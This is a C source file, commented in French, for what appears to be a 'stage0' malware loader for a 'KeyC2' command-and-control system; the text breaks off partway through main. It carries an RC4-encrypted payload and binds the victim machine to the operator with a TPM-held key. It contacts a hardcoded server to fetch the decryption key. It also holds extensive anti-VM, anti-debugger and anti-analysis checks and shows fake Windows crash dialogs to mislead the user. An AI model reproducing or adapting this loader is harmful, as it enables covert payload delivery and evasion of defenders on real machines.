#define UNICODE
#include <windows.h>
#include <ncrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winhttp.h>
#include <bcrypt.h>
#include <tlhelp32.h>
#include <psapi.h>

#pragma comment(lib, "ncrypt.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "psapi.lib")

// Définition de NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

// Configuration
#define TOKEN "22d7c107fe406fc88c29092731a2960a"
#define SERVER_URL "http://192.168.1.189:8000/"
#define KEY_NAME L"TPM2_HMAC_E46E4D4C"

// Charge utile chiffrée
unsigned char encrypted_payload[] = {
    0x82, 0x38, 0x69, 0x45, 0xf9, 0x0d, 0xb9, 0x9d, 0xe8, 0x94, 0x60, 0x9d, 0x9a, 0x8e, 0xc8, 0xa3, 0xe1, 0xf2, 0x6e, 0x8b, 0x7a, 0xa7, 0xa8, 0xf8, 0x05, 0x7f, 0xc7, 0x54, 0x8f, 0x2f, 0x2c, 0x11, 0xe9, 0x43, 0xd8, 0x9a, 0xd4, 0xa0, 0xc7, 0x75, 0xa9, 0x6c, 0x4f, 0xaa, 0x9d, 0x02, 0x6d, 0xe9, 0xfb, 0xe8, 0x09, 0x29, 0x25, 0xee, 0x4e, 0x9b, 0xea, 0xa3, 0xb6, 0xc4, 0x89, 0x8d, 0xbb, 0x92, 0xd8, 0xa6, 0x3b, 0x1b, 0xbe, 0x36, 0x42, 0x2f, 0xce, 0x5a, 0x87, 0x80, 0x8a, 0x85, 0x13, 0x6d, 0x20, 0x9f, 0xdd, 0x54, 0x83, 0x53, 0xd8, 0x34, 0x3a, 0x8e, 0xcd, 0xf9, 0x00, 0x5b, 0x72, 0xa1, 0xe8, 0xfa, 0x01, 0x0d, 0xdd, 0x01, 0x43, 0x24, 0xb6, 0x8b, 0x9d, 0xd7, 0x0f, 0x8e, 0x7e, 0x2d, 0x64, 0x15, 0xd7, 0x84, 0x5a, 0xb4, 0x3b, 0xbf, 0x01, 0x34, 0x8d, 0xef, 0xa2, 0x8c, 0xd0, 0x3e, 0x4b, 0x65, 0xb0, 0x65, 0x0b, 0xdf, 0x5b, 0xc3, 0x7b, 0xb9, 0x74, 0x29, 0xc3, 0xaf, 0x3d, 0x46, 0x8b, 0x08, 0x85, 0x46, 0xcb, 0xe1, 0x14, 0xc4, 0x67, 0xe6, 0x64, 0x3f, 0x8e, 0x1f, 0x69, 0x5d, 0x6d, 0x8a, 0x0b, 0x06, 0xc9, 0x0b, 0x74, 0xa6, 0xe4, 0x6f, 0xac, 0x6b, 0x4b, 0xdb, 0xcb, 0x05, 0x82, 0xab, 0xe2, 0x45, 0x04, 0x64, 0xe7, 0x4a, 0x4d, 0xc1, 0xbf, 0xd2, 0xc8, 0x4c, 0xde, 0x3d, 0x7e, 0x7f, 0xe4, 0x47, 0xff, 0x0c, 0xfe, 0xa3, 0x35, 0x74, 0x1a, 0x1c, 0xf2, 0x1a, 0x95, 0x67, 0xa4, 0x3e, 0x0a, 0x8b, 0x17, 0x84, 0x0e, 0xfa, 0x42, 0x8b, 0xe7, 0xcc, 0x9d, 0xda, 0xbf, 0x6f, 0x2a, 0x47, 0x0f, 0x6a, 0x3f, 0x42, 0xdc, 0x5e, 0x29, 0x51, 0x7d, 0x50, 0x0e, 0x25, 0xfc, 0x32, 0xf4, 0xdb, 0x02, 0x4c, 0xe1, 0x7d, 0xd8, 0x39, 0xab, 0xe4, 0xa3, 0xdb, 0xef, 0xe4, 0xde, 0xb0, 0x7a, 0x6b, 0xc1, 0x94, 0xca, 0x97, 0x85, 0x4f, 0x73, 0xa0, 0x8d, 0xc4, 0xcf, 0x5a, 0xc1, 0xc6, 0x22, 0x8e, 0xf7, 0xb9, 0x5e, 0xe9, 0x52, 0x86, 0xe3, 0x47, 0x68, 0x91, 0xd8, 0x08, 0xf9, 0x7a, 0xe9, 0x17, 0xc0, 0x12, 0x50, 0x5a, 0xc9, 0x8b, 0x67, 0x73, 0xac, 0x66, 0x03, 0x90, 0xd6, 0x0d, 0xd8, 0x21
};

// Flag de debug
#ifndef DEBUG
#define DEBUG 0
#endif

// Fonction de debug
#define DEBUG_PRINT(fmt, ...) do { \
    if (DEBUG) { \
        printf("[DEBUG] " fmt "\n", ##__VA_ARGS__); \
    } \
} while(0)

// Fonction pour calculer le hash SHA256
BOOL calculate_sha256(const char* input, BYTE* hash) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    NTSTATUS status;
    DWORD cbData = 0;
    DWORD cbHash = 0;
    DWORD cbHashObject = 0;
    PBYTE pbHashObject = NULL;
    BOOL result = FALSE;

    // Ouvrir l'algorithme SHA256
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(status)) {
        DEBUG_PRINT("BCryptOpenAlgorithmProvider failed: 0x%x\n", status);
        goto cleanup;
    }

    // Calculer la taille du hash et de l'objet hash
    status = BCryptGetProperty(hAlg, BCRYPT_HASH_LENGTH, (PBYTE)&cbHash, sizeof(DWORD), &cbData, 0);
    if (!NT_SUCCESS(status)) {
        DEBUG_PRINT("BCryptGetProperty(HASH_LENGTH) failed: 0x%x\n", status);
        goto cleanup;
    }

    status = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbHashObject, sizeof(DWORD), &cbData, 0);
    if (!NT_SUCCESS(status)) {
        DEBUG_PRINT("BCryptGetProperty(OBJECT_LENGTH) failed: 0x%x\n", status);
        goto cleanup;
    }

    // Allouer l'objet hash
    pbHashObject = (PBYTE)malloc(cbHashObject);
    if (pbHashObject == NULL) {
        DEBUG_PRINT("Memory allocation failed\n");
        goto cleanup;
    }

    // Créer le hash
    status = BCryptCreateHash(hAlg, &hHash, pbHashObject, cbHashObject, NULL, 0, 0);
    if (!NT_SUCCESS(status)) {
        DEBUG_PRINT("BCryptCreateHash failed: 0x%x\n", status);
        goto cleanup;
    }

    // Hasher les données
    status = BCryptHashData(hHash, (PBYTE)input, (ULONG)strlen(input), 0);
    if (!NT_SUCCESS(status)) {
        DEBUG_PRINT("BCryptHashData failed: 0x%x\n", status);
        goto cleanup;
    }

    // Finaliser le hash
    status = BCryptFinishHash(hHash, hash, cbHash, 0);
    if (!NT_SUCCESS(status)) {
        DEBUG_PRINT("BCryptFinishHash failed: 0x%x\n", status);
        goto cleanup;
    }

    result = TRUE;

cleanup:
    if (hHash) BCryptDestroyHash(hHash);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    if (pbHashObject) free(pbHashObject);
    return result;
}

// Fonction pour signer le token avec TPM
BOOL sign_token(const char* token, char* signature_hex, size_t signature_hex_size) {
    NCRYPT_PROV_HANDLE hProv = 0;
    NCRYPT_KEY_HANDLE hKey = 0;
    SECURITY_STATUS status;
    BYTE hash[32];
    BYTE signature[512];
    DWORD sigLen = 0;
    BOOL result = FALSE;

    // Calculer le hash SHA256 du token
    if (!calculate_sha256(token, hash)) {
        DEBUG_PRINT("Failed to calculate SHA256 hash\n");
        return FALSE;
    }

    // 1. Ouvrir le provider TPM
    status = NCryptOpenStorageProvider(&hProv, MS_PLATFORM_CRYPTO_PROVIDER, 0);
    if (status != ERROR_SUCCESS) {
        DEBUG_PRINT("NCryptOpenStorageProvider failed: 0x%x\n", status);
        return FALSE;
    }

    // 2. Ouvrir la clé existante ou la créer
    status = NCryptOpenKey(hProv, &hKey, KEY_NAME, 0, 0);
    if (status != ERROR_SUCCESS) {
        status = NCryptCreatePersistedKey(hProv, &hKey, NCRYPT_RSA_ALGORITHM, KEY_NAME, 0, 0);
        if (status != ERROR_SUCCESS) {
            DEBUG_PRINT("NCryptCreatePersistedKey failed: 0x%x\n", status);
            goto cleanup;
        }

        // 2.a Définir la taille de clé
        DWORD keyLength = 2048;
        status = NCryptSetProperty(hKey, NCRYPT_LENGTH_PROPERTY, (BYTE*)&keyLength, sizeof(keyLength), 0);
        if (status != ERROR_SUCCESS) {
            DEBUG_PRINT("NCryptSetProperty(NCRYPT_LENGTH_PROPERTY) failed: 0x%x\n", status);
            goto cleanup;
        }

        // 2.b Marquer la clé comme NON exportable
        DWORD exportPolicy = 0; // interdiction d'exporter
        status = NCryptSetProperty(hKey, NCRYPT_EXPORT_POLICY_PROPERTY, (BYTE*)&exportPolicy, sizeof(exportPolicy), 0);
        if (status != ERROR_SUCCESS) {
            DEBUG_PRINT("NCryptSetProperty(NCRYPT_EXPORT_POLICY_PROPERTY) failed: 0x%x\n", status);
            goto cleanup;
        }

        // 2.c Finaliser la clé
        status = NCryptFinalizeKey(hKey, 0);
        if (status != ERROR_SUCCESS) {
            DEBUG_PRINT("NCryptFinalizeKey failed: 0x%x\n", status);
            goto cleanup;
        }
    }

    // 3. Signer avec PKCS#1 padding + SHA256
    BCRYPT_PKCS1_PADDING_INFO paddingInfo;
    paddingInfo.pszAlgId = BCRYPT_SHA256_ALGORITHM;

    status = NCryptSignHash(
        hKey,
        &paddingInfo,
        hash, sizeof(hash),
        signature, sizeof(signature),
        &sigLen,
        NCRYPT_PAD_PKCS1_FLAG
    );

    if (status != ERROR_SUCCESS) {
        DEBUG_PRINT("NCryptSignHash failed: 0x%x\n", status);
        goto cleanup;
    }

    // 4. Convertir la signature en hexadécimal
    if (signature_hex_size < (sigLen * 2 + 1)) {
        DEBUG_PRINT("Buffer too small for signature\n");
        goto cleanup;
    }

    for (DWORD i = 0; i < sigLen; i++) {
        sprintf_s(signature_hex + (i * 2), 3, "%02X", signature[i]);
    }
    signature_hex[sigLen * 2] = '\0';

    result = TRUE;

cleanup:
    if (hKey) NCryptFreeObject(hKey);
    if (hProv) NCryptFreeObject(hProv);
    return result;
}

// Fonction pour faire une requête HTTP
BOOL make_http_request(const char* url, const char* token, const char* signature) {
    DEBUG_PRINT("Tentative de connexion au serveur: %s\n", url);
    
    // Initialiser WinHTTP
    HINTERNET hSession = WinHttpOpen(L"KeyC2 Client/1.0", 
                                   WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                   WINHTTP_NO_PROXY_NAME, 
                                   WINHTTP_NO_PROXY_BYPASS, 
                                   0);
    if (!hSession) {
        DEBUG_PRINT("Erreur WinHttpOpen: %lu", GetLastError());
        return FALSE;
    }
    DEBUG_PRINT("Session WinHTTP initialisee");

    // Extraire l'hôte et le port de l'URL
    char host[256] = {0};
    int port = 80;
    char path[2048] = {0};
    
    // Parser l'URL
    if (sscanf_s(url, "http://%[^:/]:%d/%s", host, sizeof(host), &port, path, sizeof(path)) < 1) {
        if (sscanf_s(url, "http://%[^/]/%s", host, sizeof(host), path, sizeof(path)) < 1) {
            DEBUG_PRINT("URL invalide: %s\n", url);
            WinHttpCloseHandle(hSession);
            return FALSE;
        }
    }

    // Convertir l'hôte en wide string
    WCHAR wide_host[256];
    MultiByteToWideChar(CP_UTF8, 0, host, -1, wide_host, 256);

    // Créer une connexion
    HINTERNET hConnect = WinHttpConnect(hSession, wide_host, port, 0);
    if (!hConnect) {
        DEBUG_PRINT("Erreur WinHttpConnect: %lu\n", GetLastError());
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    // Construire le chemin avec les paramètres
    char request_path[2048];
    sprintf_s(request_path, sizeof(request_path), 
             "/tokens/register?token=%s&signedToken=%s", 
             token, signature);

    // Convertir en wide string
    WCHAR wide_path[2048];
    MultiByteToWideChar(CP_UTF8, 0, request_path, -1, wide_path, 2048);

    // Créer une requête POST
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", wide_path,
                                          NULL, WINHTTP_NO_REFERER,
                                          WINHTTP_DEFAULT_ACCEPT_TYPES,
                                          0);
    if (!hRequest) {
        DEBUG_PRINT("Erreur WinHttpOpenRequest: %lu\n", GetLastError());
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    // Ajouter des en-têtes HTTP
    const wchar_t* headers = L"User-Agent: KeyC2 Client/1.0\r\n"
                            L"Accept: */*\r\n"
                            L"Connection: close\r\n";
    
    if (!WinHttpAddRequestHeaders(hRequest, headers, -1L, WINHTTP_ADDREQ_FLAG_ADD)) {
        DEBUG_PRINT("Erreur WinHttpAddRequestHeaders: %lu\n", GetLastError());
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    // Envoyer la requête (sans corps car les paramètres sont dans l'URL)
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                           WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        DEBUG_PRINT("Erreur WinHttpSendRequest: %lu\n", GetLastError());
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    // Recevoir la réponse
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        DEBUG_PRINT("Erreur WinHttpReceiveResponse: %lu\n", GetLastError());
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    // Lire le code de statut
    DWORD statusCode = 0;
    DWORD statusCodeSize = sizeof(statusCode);
    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                       WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusCodeSize,
                       WINHTTP_NO_HEADER_INDEX);
    DEBUG_PRINT("Code de statut HTTP: %lu\n", statusCode);

    // Lire le corps de la réponse
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    char* pszOutBuffer;
    BOOL result = FALSE;
    
    do {
        // Vérifier la taille disponible
        dwSize = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
            DEBUG_PRINT("Erreur WinHttpQueryDataAvailable: %lu", GetLastError());
            break;
        }

        // Allouer de l'espace pour le buffer
        pszOutBuffer = (char*)malloc(dwSize + 1);
        if (!pszOutBuffer) {
            DEBUG_PRINT("Erreur d'allocation memoire");
            dwSize = 0;
            break;
        }

        // Lire les données
        ZeroMemory(pszOutBuffer, dwSize + 1);
        if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, 
                            dwSize, &dwDownloaded)) {
            DEBUG_PRINT("Erreur WinHttpReadData: %lu", GetLastError());
            free(pszOutBuffer);
            break;
        }

        // Vérifier si la réponse contient une erreur
        if (strstr(pszOutBuffer, "\"error\"") != NULL) {
            // Afficher un message d'erreur incompréhensible
            MessageBoxA(NULL, 
                "Error 0xC000A217: The system detected an overrun of a stack-based buffer in this application. This overrun could potentially allow a malicious user to gain control of this application.",
                "System Error",
                MB_ICONERROR | MB_OK);
            free(pszOutBuffer);
            return FALSE;
        }

        // Vérifier si le token est déjà signé
        if (strstr(pszOutBuffer, "\"detail\":\"Token is already signed\"") != NULL) {
            DEBUG_PRINT("Token deja signe, passage a la verification");
            result = TRUE;
            free(pszOutBuffer);
            break;
        }

        // Afficher les données reçues en mode debug
        DEBUG_PRINT("Donnees recues (%lu bytes):\n%.*s", 
               dwDownloaded, dwDownloaded, pszOutBuffer);

        // Libérer le buffer
        free(pszOutBuffer);

    } while (dwSize > 0);

    // Nettoyer
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return result || statusCode == 200;
}

// Fonction pour décoder base64
int base64_decode(const char* input, unsigned char* output, size_t* output_len) {
    static const unsigned char base64_table[256] = {
        64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
        64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
        64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64, 64, 63,
        52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64,
        64,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,
        15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 64,
        64, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
        41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 64, 64, 64, 64, 64,
        64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
        64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
        64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
        64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
        64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
        64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
        64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
        64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
        64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64
    };

    size_t input_len = strlen(input);
    size_t i = 0, j = 0;
    unsigned char sextet_a, sextet_b, sextet_c, sextet_d;
    unsigned char triple;

    while (i < input_len) {
        sextet_a = base64_table[(unsigned char)input[i++]];
        sextet_b = base64_table[(unsigned char)input[i++]];
        sextet_c = base64_table[(unsigned char)input[i++]];
        sextet_d = base64_table[(unsigned char)input[i++]];

        if (sextet_a == 64 || sextet_b == 64) break;

        triple = (sextet_a << 2) | (sextet_b >> 4);
        output[j++] = triple;

        if (sextet_c == 64) break;
        triple = ((sextet_b & 0x0F) << 4) | (sextet_c >> 2);
        output[j++] = triple;

        if (sextet_d == 64) break;
        triple = ((sextet_c & 0x03) << 6) | sextet_d;
        output[j++] = triple;
    }

    *output_len = j;
    return 0;
}

// Fonction de déchiffrement RC4
void rc4_decrypt(unsigned char* data, size_t data_len, unsigned char* key, size_t key_len) {
    DEBUG_PRINT("Debut du dechiffrement RC4:\n");
    DEBUG_PRINT("- Taille des donnees: %zu bytes\n", data_len);
    DEBUG_PRINT("- Taille de la cle: %zu bytes\n", key_len);
    DEBUG_PRINT("- Premiers octets de la cle: ");
    for (size_t i = 0; i < 16 && i < key_len; i++) {
        DEBUG_PRINT("%02X ", key[i]);
    }
    DEBUG_PRINT("\n");
    
    // Initialisation du tableau S
    unsigned char S[256];
    for (int i = 0; i < 256; i++) {
        S[i] = i;
    }
    
    // Key-scheduling algorithm (KSA)
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % key_len]) % 256;
        unsigned char temp = S[i];
        S[i] = S[j];
        S[j] = temp;
    }
    
    // Pseudo-random generation algorithm (PRGA)
    int i = 0;
    j = 0;
    for (size_t n = 0; n < data_len; n++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        unsigned char temp = S[i];
        S[i] = S[j];
        S[j] = temp;
        unsigned char k = S[(S[i] + S[j]) % 256];
        data[n] ^= k;
    }
    DEBUG_PRINT("Dechiffrement RC4 termine\n");
}

// Fonction pour récupérer la clé de déchiffrement
BOOL get_decryption_key(const char* url, const char* token, const char* signature, char* decryption_key, size_t key_size) {
    DEBUG_PRINT("Tentative de recuperation de la cle de dechiffrement\n");
    
    // Initialiser WinHTTP
    HINTERNET hSession = WinHttpOpen(L"KeyC2 Client/1.0", 
                                   WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                   WINHTTP_NO_PROXY_NAME, 
                                   WINHTTP_NO_PROXY_BYPASS, 
                                   0);
    if (!hSession) {
        DEBUG_PRINT("Erreur WinHttpOpen: %lu", GetLastError());
        return FALSE;
    }
    DEBUG_PRINT("Session WinHTTP initialisee");

    // Créer une connexion
    HINTERNET hConnect = WinHttpConnect(hSession, L"127.0.0.1", 8000, 0);
    if (!hConnect) {
        DEBUG_PRINT("Erreur WinHttpConnect: %lu\n", GetLastError());
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    // Construire l'URL avec les paramètres
    char request_path[2048];
    sprintf_s(request_path, sizeof(request_path), 
             "/verify?token=%s&signedToken=%s", 
             token, signature);

    // Convertir en wide string
    WCHAR wide_path[2048];
    MultiByteToWideChar(CP_UTF8, 0, request_path, -1, wide_path, 2048);

    // Créer une requête POST
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", wide_path,
                                          NULL, WINHTTP_NO_REFERER,
                                          WINHTTP_DEFAULT_ACCEPT_TYPES,
                                          0);
    if (!hRequest) {
        DEBUG_PRINT("Erreur WinHttpOpenRequest: %lu\n", GetLastError());
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    // Ajouter des en-têtes HTTP
    const wchar_t* headers = L"User-Agent: KeyC2 Client/1.0\r\n"
                            L"Accept: */*\r\n"
                            L"Connection: close\r\n";
    
    if (!WinHttpAddRequestHeaders(hRequest, headers, -1L, WINHTTP_ADDREQ_FLAG_ADD)) {
        DEBUG_PRINT("Erreur WinHttpAddRequestHeaders: %lu\n", GetLastError());
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    // Envoyer la requête
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                           WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        DEBUG_PRINT("Erreur WinHttpSendRequest: %lu\n", GetLastError());
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    // Recevoir la réponse
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        DEBUG_PRINT("Erreur WinHttpReceiveResponse: %lu\n", GetLastError());
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    // Lire le code de statut
    DWORD statusCode = 0;
    DWORD statusCodeSize = sizeof(statusCode);
    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                       WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusCodeSize,
                       WINHTTP_NO_HEADER_INDEX);
    DEBUG_PRINT("Code de statut HTTP: %lu\n", statusCode);

    if (statusCode != 200) {
        DEBUG_PRINT("Erreur: Le serveur a retourne un code d'erreur\n");
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    // Lire le corps de la réponse
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    char* pszOutBuffer = NULL;
    BOOL result = FALSE;
    
    do {
        // Vérifier la taille disponible
        dwSize = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
            DEBUG_PRINT("Erreur WinHttpQueryDataAvailable: %lu", GetLastError());
            break;
        }

        // Allouer de l'espace pour le buffer
        pszOutBuffer = (char*)malloc(dwSize + 1);
        if (!pszOutBuffer) {
            DEBUG_PRINT("Erreur d'allocation memoire");
            dwSize = 0;
            break;
        }

        // Lire les données
        ZeroMemory(pszOutBuffer, dwSize + 1);
        if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, 
                            dwSize, &dwDownloaded)) {
            DEBUG_PRINT("Erreur WinHttpReadData: %lu", GetLastError());
            free(pszOutBuffer);
            break;
        }

        // Vérifier si la réponse contient une erreur
        if (strstr(pszOutBuffer, "\"error\"") != NULL) {
            // Afficher un message d'erreur incompréhensible
            MessageBoxA(NULL, 
                "Error 0xC0000005: Access violation - The instruction at 0x00007FF81234ABCD referenced memory at 0x0000000000000000. The memory could not be read.",
                "System Error",
                MB_ICONERROR | MB_OK);
            free(pszOutBuffer);
            return FALSE;
        }

        // Extraire la clé de déchiffrement de la réponse JSON
        // Format attendu: {"decryptionKey": "..."}
        char* key_start = strstr(pszOutBuffer, "\"decryptionKey\":\"");
        if (key_start) {
            key_start += 17; // Longueur de "decryptionKey":"
            char* key_end = strchr(key_start, '\"');
            if (key_end) {
                size_t key_len = key_end - key_start;
                if (key_len < key_size) {
                    strncpy_s(decryption_key, key_size, key_start, key_len);
                    decryption_key[key_len] = '\0';
                    result = TRUE;
                    DEBUG_PRINT("Cle de dechiffrement recuperee: %s", decryption_key);
                } else {
                    DEBUG_PRINT("Buffer trop petit pour la cle de dechiffrement");
                }
            }
        }

        // Libérer le buffer
        free(pszOutBuffer);

    } while (dwSize > 0);

    // Nettoyer
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return result;
}

// Anti-sandbox checks
BOOL is_running_in_vm() {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    return (si.dwNumberOfProcessors < 2);
}

BOOL has_debugger() {
    return IsDebuggerPresent();
}

BOOL check_suspicious_processes() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return FALSE;

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(pe32);

    const wchar_t* suspicious[] = {
        L"vmtoolsd.exe", L"vmwaretray.exe", L"vmwareuser.exe",
        L"VBoxService.exe", L"VBoxTray.exe", L"xenservice.exe",
        L"wireshark.exe", L"procmon.exe", L"procexp.exe",
        L"ollydbg.exe", L"idaq.exe", L"idaq64.exe",
        L"ImmunityDebugger.exe", L"x32dbg.exe", L"x64dbg.exe",
        L"windbg.exe", L"x64dbg.exe", L"dnSpy.exe",
        L"cheatengine-x86_64.exe", L"cheatengine-i386.exe",
        L"fiddler.exe", L"httpdebugger.exe", L"processhacker.exe"
    };

    if (Process32FirstW(snapshot, &pe32)) {
        do {
            for (int i = 0; i < sizeof(suspicious) / sizeof(suspicious[0]); i++) {
                if (_wcsicmp(pe32.szExeFile, suspicious[i]) == 0) {
                    CloseHandle(snapshot);
                    return TRUE;
                }
            }
        } while (Process32NextW(snapshot, &pe32));
    }

    CloseHandle(snapshot);
    return FALSE;
}

BOOL check_system_info() {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    
    // Check for common VM indicators
    if (si.dwNumberOfProcessors < 2) return TRUE;
    if (si.dwProcessorType == 0) return TRUE;
    
    // Check memory size (VMs often have less RAM)
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    if (memInfo.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return TRUE; // Less than 2GB RAM
    
    return FALSE;
}

BOOL check_artifacts() {
    const wchar_t* artifacts[] = {
        L"C:\\WINDOWS\\system32\\drivers\\vmmouse.sys",
        L"C:\\WINDOWS\\system32\\drivers\\vmhgfs.sys",
        L"C:\\WINDOWS\\system32\\drivers\\VBoxMouse.sys",
        L"C:\\WINDOWS\\system32\\drivers\\VBoxGuest.sys",
        L"C:\\WINDOWS\\system32\\vboxdisp.dll",
        L"C:\\WINDOWS\\system32\\vboxhook.dll",
        L"C:\\WINDOWS\\system32\\vmGuestLib.dll",
        L"C:\\WINDOWS\\system32\\vmhgfs.dll"
    };

    for (int i = 0; i < sizeof(artifacts) / sizeof(artifacts[0]); i++) {
        if (GetFileAttributesW(artifacts[i]) != INVALID_FILE_ATTRIBUTES) {
            return TRUE;
        }
    }
    return FALSE;
}

BOOL check_registry() {
    const wchar_t* registry_keys[] = {
        L"SOFTWARE\\VMware, Inc.\\VMware Tools",
        L"SOFTWARE\\Oracle\\VirtualBox Guest Additions",
        L"HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 2\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0",
        L"SYSTEM\\CurrentControlSet\\Enum\\IDE",
        L"SYSTEM\\CurrentControlSet\\Control\\VirtualDeviceDrivers"
    };

    for (int i = 0; i < sizeof(registry_keys) / sizeof(registry_keys[0]); i++) {
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, registry_keys[i], 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return TRUE;
        }
    }
    return FALSE;
}

BOOL check_sandbox() {
    // Basic checks
    if (is_running_in_vm() || has_debugger() || check_suspicious_processes()) {
        return TRUE;
    }

    // Advanced checks
    if (check_system_info() || check_artifacts() || check_registry()) {
        return TRUE;
    }

    // Timing check (VMs often have slower execution)
    LARGE_INTEGER freq, start, end;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    
    // Perform some CPU-intensive operations
    volatile int dummy = 0;
    for (int i = 0; i < 1000000; i++) {
        dummy += i;
    }
    
    QueryPerformanceCounter(&end);
    double elapsed = (end.QuadPart - start.QuadPart) * 1000.0 / freq.QuadPart;
    
    // If execution is too slow, likely in a VM
    if (elapsed > 100.0) { // More than 100ms for the loop
        return TRUE;
    }

    return FALSE;
}

int main() {
    // Anti-sandbox check
    //if (check_sandbox()) {
    //    MessageBoxA(NULL, "Error 0xC000A217: The system detected an overrun of a stack-based buffer in this application. This overrun could potentially allow a malicious user to gain control of this application.", "System Error", MB_ICONERROR | MB_OK);
    //    return 0;
    //}

    DEBUG_PRINT("\n[+] Demarrage du stage0\n");
    
    // Afficher le token
    DEBUG_PRINT("[*] Token: %s\n", TOKEN);

    // Signer le token
    char signature_hex[1024];
    if (!sign_token(TOKEN, signature_hex, sizeof(signature_hex))) {
        DEBUG_PRINT("[!] Erreur lors de la signature du token\n");
        return 1;
    }

    // Enregistrer le token signé auprès du serveur
    if (!make_http_request(SERVER_URL, TOKEN, signature_hex)) {
